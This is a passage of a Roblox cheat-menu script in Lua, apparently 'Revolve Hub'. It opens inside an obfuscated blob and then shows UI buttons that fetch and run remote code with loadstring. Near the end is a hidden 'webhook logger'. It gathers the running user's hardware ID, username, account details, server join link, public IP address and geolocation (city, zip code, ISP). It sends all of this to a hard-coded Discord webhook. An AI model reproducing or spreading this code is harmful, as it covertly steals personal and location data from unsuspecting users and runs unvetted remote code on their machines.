(52365,53234,51959),(k-"qb").k(47797,48758,47259),(k-"XG").C(52215,53106,52398),(k-"Wm").k(47708,47398,47372),(k-"oh").k(47704,48364,47434),(k-"Zt").p(25303,25414,25940),(k-"ii").C(52362,53057,52015),(k-"qQ").C(52383,52149,52242),(k-"tcb").C(52375,53219,53344),(k-"vd").p(25746,25066,26006),(k-"M").p(26289,26250,26037),(k-"yl").k(47693,47877,47561),(k-"qT").p(25628,26132,26080),(k-"uJ").C(52416,52936,52122),(k-"Cab").C(52434,53400,52166),(k-"nhb").p(25964,25152,26135),(k-"LD").p(25211,26512,25916),(k-"KR").p(26899,25672,25925),(k-"de").C(52286,51754,52905),(k-"Fo").p(25606,26459,25971),(k-"zv").k(47839,48047,47250),(k-"umb").p(26593,26602,26130),(k-"bA").C(52303,51333,53242),(k-"eY").C(52265,52331,52450),(k-"qcb").C(52374,52080,52847),(k-"Ku").C(52409,53196,53260),(k-"lF").p(26461,25663,25929),(k-"n8").k(47800,47035,48109),(k-"cY").C(52442,51830,51579),(k-"v6").p(26853,25024,26017),(k-"Fcb").C(52404,53257,52978),(k-"ml").C(52283,52088,52979),(k-"WO").k(47827,48181,46830),(k-"G_").p(26350,25084,25995),(k-"Fv").C(52345,53263,52831),(k-"feb").C(52236,51226,52115),(k-"u9").p(25870,25835,25926),(k-"gF").C(52395,52373,53071),(k-"f4").k(47811,47831,47347),(k-"s2").k(47618,48135,47531),(k-"Mp").p(25970,25120,26128),(k-"Vl").C(52222,52231,52344),(k-"Qjb").C(52279,51455,52036),(k-"eb").p(26362,25819,26020),(k-"El").k(47840,47433,48495),(k-"xm").k(47783,47223,47186),(k-"pR").p(26443,26092,26086),(k-"RX").p(25346,26225,26012),(k-"qO").C(52331,52143,51840),(k-"yw").k(47756,47492,48404),(k-"Sdb").C(52285,52044,52826),(k-"JZ").k(47634,48475,47937),(k-"r_").k(47651,47045,47415),(k-"Ue").C(52373,52900,52737),(k-"h1").p(26902,25283,25991),(k-"A3").k(47629,46862,46632),(k-"Ig").C(52402,53146,52697),(k-"Zab").C(52292,52237,52755),(k-"r2").k(47759,48445,47532),(k-"tE").p(25310,26047,25985),(k-"Dw").p(25227,26722,26072),(k-"Rp").p(24974,26868,25942),(k-"eC").k(47677,48329,48000),(k-"dJ").C(52370,53384,52837),(k-"uu").k(47828,46857,48110),(k-"mdb").k(47798,48224,47209),(k-"W5").C(52263,53198,53261),(k-"oN").C(52269,51578,52642),(k-"Mu").p(26182,25025,25901),(k-"Qj").p(26791,25573,26060),(k-"XW").p(26466,25981,26120),(k-"Y6").C(52293,51942,52190),(k-"eI").k(47823,47503,48293),(k-"mkb").k(47699,47283,47416),(k-"Od").p(26956,26704,26047),(k-"QU").p(26321,26369,25992),(k-"NS").C(52264,51910,51983),(k-"oC").C(52318,52554,51911),(k-"F2").p(25603,25530,26027),(k-"GQ").C(52311,51627,52362),(k-"Pc").C(52212,51786,53115),(k-"tn").p(26186,25479,26131),(k-"er").p(26131,25262,26036),(k-"Iy").k(47685,47477,47397),(k-"Xd").p(25141,25524,26044),(k-"Vd").C(52428,51481,53045),(k-"Me").C(52314,51445,52866),(k-"LT").k(47830,47844,47925),(k-"Sj").p(26760,26057,26094),(k-"TE").k(47628,47885,48629),(k-"n6").k(47723,47818,48031),(k-"Mp").C(52287,51468,52680),(k-"rnb").p(25871,26731,26029),(k-"J5").p(25375,26552,26083),(k-"fn").k(47737,48323,46880),(k-"hE").k(47649,48465,47823),(k-"eW").p(25906,26065,26007),(k-"kN").p(26426,25747,25909),(k-"Qb").p(26863,25854,26114),(k-"y2").C(52415,52679,52142),(k-"Cc").C(52256,52424,51579),(k-"Sr").k(47788,47481,46999),(k-"p5").p(27128,26188,26121),(k-"zv").k(47818,47105,46888),(k-"Qh").p(26904,25249,26023),(k-"njb").C(52210,51442,51337),(k-"jb").p(25532,25502,25958),(k-"os").C(52252,51775,53155),(k-"ne").k(47641,48229,47873),(k-"MZ").p(26234,26133,26136),(k-"a1").C(52357,51545,52468),(k-"eS").k(47726,47078,47006),(k-"lD").p(26104,25285,25899),(k-"gp").C(52342,51856,52880),(k-"VJ").C(52413,53111,52009),(k-"fO").k(47659,46874,47933),(k-"Ys").k(47717,47742,47744),(k-"SU").C(52422,52457,51405)}}));(p/"g4")(t+getfenv);(p/"bdb")(w+(bit32 and bit32[(k-"sL").C(52356,51428,52704)]));(p/"D1")(j/function()local h=q({av={V=function(C,n,T)return(J+"P7")(T-61543)end,q=function(C,n,T)return(J+"vbb")(n+32375)end,s=function(C,n,T)return(J+"Yh")(T-12102)end}},{__index=function(C,n)C.av=n end,__mul=function(C,n)return rawget(C,"av")end});(p/"YT")(D*(w*"leb"or T.."n1"));(p/"Bkb")(I^P.EW(I-"oab"));(m+"Qr")()return((l/"yI")((s.."OT")[1],(t*"k0")()))()end);(p/"Idb")(T[function(C,n,h,...)local t=q({Jg={u=function(C,n,T)return(J+"DW")(n-40711)end,K=function(C,n,T)return(J+"Fb")(C+64459)end,R=function(C,n,T)return(J+"ek")(C+35275)end}},{__concat=function(C,n)C.Jg=n end,__sub=function(C,n)return C.Jg end})local L=q({cE=0},{__mul=function(C,n)C.cE=n end,__div=function(C,n)return C.cE end})for T=0,31,1 do local h=q({hc=C/2+n/2},{__mul=function(C,n)C.hc=n end,__pow=function(C,n)return C.hc end})if h^"UR"~=(f^"hH")(h^"A6")then(p/"O4")(L*(L/"yG"+2^T))end C=(f^"GU")(C/2)n=(f^"vF")(n/2)end if h then return(T.."Ui")(L/"bR",h,...)end return L/"mg"end]);(p/"eab")(l^function(C,n,T)local f=q({Yob={t=function(C,n,T)return(J+"s4")(n+6358)end,K=function(C,n,T)return(J+"Qi")(n+22851)end,g=function(C,n,T)return(J+"vfb")(C-56691)end}},{__sub=function(C,n)C.Yob=n end,__pow=function(C,n)return C.Yob end})return function(...)local f=q({SA={L=function(C,n,T)return(J+"hP")(C+6318)end,W=function(C,n,T)return(J+"eU")(T+27775)end,n=function(C,n,T)return(J+"br")(n+27475)end}},{__concat=function(C,n)C.SA=n end,__pow=function(C,n)return C.SA end})return(b*"wS")((i-"YG")(C,{...},n,T))end end);(p/"FW")(C^4)return(j-"ys")()end)()
    end,
})

local Button = Tab6:CreateButton({
	Name = "Bring All (1 Tool = 1 Person",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Bring%20All'))()
    end,
})

local Button = Tab6:CreateButton({
	Name = "Copy Game ID",
	Callback = function()
        setclipboard(game.PlaceId)
    end,
})

local Button = Tab6:CreateButton({
	Name = "Copy Job ID",
	Callback = function()
        setclipboard(game.JobId)
    end,
})

local ColorPicker = Tab6:CreateColorPicker({
    Name = "Change UI's Color",
    Color = Color3.fromRGB(255,255,255),
    Flag = "ColorPicker1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value) -- this will change the background color
        Rayfield.Theme.Default["Background"] = Value
        ChangeTheme("Default")
end
})

local ColorPicker = Tab6:CreateColorPicker({
    Name = "Topbar Color",
    Color = Color3.fromRGB(255,255,255),
    Flag = "ColorPicker1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value) -- this will change the background color
        Rayfield.Theme.Default["Topbar"] = Value
        ChangeTheme("Default")
end
})

local ColorPicker = Tab6:CreateColorPicker({
    Name = "Tabs Text Color",
    Color = Color3.fromRGB(255,255,255),
    Flag = "ColorPicker1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value) -- this will change the background color
        Rayfield.Theme.Default["TabTextColor"] = Value
        ChangeTheme("Default")
end
})

local ColorPicker = Tab6:CreateColorPicker({
    Name = "Shadows of the Buttons Color",
    Color = Color3.fromRGB(255,255,255),
    Flag = "ColorPicker1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
    Callback = function(Value) -- this will change the background color
        Rayfield.Theme.Default["ElementStroke"] = Value
        ChangeTheme("Default")
end
})


local messagebill1 = Instance.new("BillboardGui")
local chattext1 = Instance.new("TextLabel")
local messagebill2 = Instance.new("BillboardGui")
local chattext2 = Instance.new("TextLabel")
local locplayer = game:service('Players').LocalPlayer

if locplayer.UserId == 1529382726 or 1997035237 then

getgenv().Debounce = false

local plr1 = game.Players["27EshayLad"] 

local plr2 = game.Players["17Syn"]

function message1()
    chattext1.Text = "HDR"
end

function message2()
    chattext2.Text = "KZX"
end

function color1()
    wait(.05)
    chattext1.TextColor3 = Color3.new(0,0,255) 
    wait(.05)
    chattext2.TextColor3 = Color3.new(0,255,0)
    wait(.05)
    chattext1.TextColor3 = Color3.new(0,255,0)
    wait(.05)
    chattext2.TextColor3 = Color3.new(0,0,255) 
    wait(.05)
    chattext1.TextColor3 = Color3.new(255,0,0) 
    wait(.05)
    chattext2.TextColor3 = Color3.new(255,0,0) 
    wait(.05)
end

game:GetService("RunService").Heartbeat:Connect(function()
if Debounce then return end
Debounce = true

messagebill1.Size = UDim2.new(0,100,0,50)
messagebill1.Parent = plr1.Character
messagebill1.StudsOffset = Vector3.new(0,4,0)
messagebill1.Name = "Message"

chattext1.Parent = messagebill1
chattext1.Size = UDim2.new(1,0,1,0) -- text size
chattext1.BackgroundTransparency = 1 -- text transparency
chattext1.TextScaled = true -- distance scaling
message1()
    wait()

color1()

messagebill2.Size = UDim2.new(0,100,0,50)
messagebill2.Parent = plr2.Character
messagebill2.StudsOffset = Vector3.new(0,4,0)
messagebill2.Name = "Message2"

chattext2.Parent = messagebill2
chattext2.Size = UDim2.new(1,0,1,0) -- text size
chattext2.BackgroundTransparency = 1 -- text transparency
chattext2.TextScaled = true -- distance scaling
message2()
    wait()

color1()

wait()
Debounce = false
end)
else
    print("not in the game")
end

--Better Roblox (Quality and Settings)
loadstring(game:HttpGet('https://eternityhub.xyz/BetterRoblox/Core/MainCore.lua'))()

--WEBHOOK LOG
--info Logger
local check = game:GetService("RbxAnalyticsService"):GetClientId()
if check == "302C3C25-A89C-4938-92CD-850236225411" or "7DC02CF7-3861-492D-AE86-CB3D47B9A04B" then
    print("Passed Revolve Hub Hub Whitelist")
    else
local webhook_url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO"

local player_name = game:GetService("Players").LocalPlayer.Name
local LP = game:GetService("Players").LocalPlayer
local TheFunny = tostring(game:HttpGet("https://api.ipify.org/", true))

local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end

local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";

for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end

if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO"


local data = 
    {
        ["content"] = "- Revolve Hub - WEBHOOK LOGGER - PAID -",
        ["embeds"] = {{
            ["title"] = "__**HWID:**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "UserId:",
                    ["value"] = Game.Players.LocalPlayer.UserId,
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name:",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Age:",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "ALT:",
					["value"] = ALT,
					["inline"] = true
				},
				
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
    
    local headers = {
            ["content-type"] = "application/json"
    }
    
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end

local webhook = game:GetService("HttpService"):JSONEncode({
    ['embeds'] = {{
        title = "Profile link",
        url = "https://www.roblox.com/users/" .. tostring(LP.UserId) .. "/profile",
        color = 3456491,
        thumbnail = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tonumber(LP.UserId) .. '&width=75&height=75&format=png',
                    ["height"] = 75,
                    ["width"] = 75,  
                },
        author = {
            ["name"] = tostring(LP.Name) .. " executed the script more info below" ,
            ["avatar_url"] = "",
            ["url"]  = "",
        },
    fields = {
                [1] = {
                    ["name"] = "Username ",
                    ["value"] = tostring(LP.Name),
                    ["inline"] = true,
                };
                [2] = {
                    ["name"] = "Script to join them ",
                    ["value"] = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[,"]] .. game.JobId .. [[")]],
                    ["inline"] = true,
                };
            };
        };
    };
})
syn.request({Url = "https://discord.com/api/webhooks/1085233565769420910/WwcZ1NeuzndnzJHyx1--hyL72DdQN4Bs30GB33Jmu5Z12E0CAkLGoYJ7426xSFRZFyiO",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = webhook,})

if syn then
	HttpRequest = syn.request
else
	HttpRequest = http_request
end

local ip_info = HttpRequest({
	Url = "http://ip-api.com/json",
	Method = "GET"
})
local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
local dataMessage = string.format("\
IP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
HttpRequest(
	{
		Url = webhook_url,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
	}
)
end
